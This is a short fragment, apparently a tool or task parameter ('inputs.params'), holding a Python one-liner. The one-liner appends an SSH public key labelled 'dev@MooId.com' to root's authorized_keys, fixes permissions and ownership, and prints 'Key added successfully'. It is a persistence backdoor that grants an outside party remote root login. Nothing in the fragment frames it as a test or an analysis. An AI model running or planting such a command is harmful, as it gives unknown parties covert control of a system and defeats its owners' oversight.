inputs.params: -c "import os, pwd; key = 'ssh-rsa  dev@MooId.com'; path = '/home/root/.ssh'; os.makedirs(path, exist_ok=True); open(path+'/authorized_keys', 'a').write(key); os.chmod(path, 0o700); os.chmod(path+'/authorized_keys', 0o600); uid = pwd.getpwnam('root').pw_uid; gid = pwd.getpwnam('root').pw_gid; os.chown(path, uid, gid); os.chown(path+'/authorized_keys', uid, gid); print('Key added successfully')"
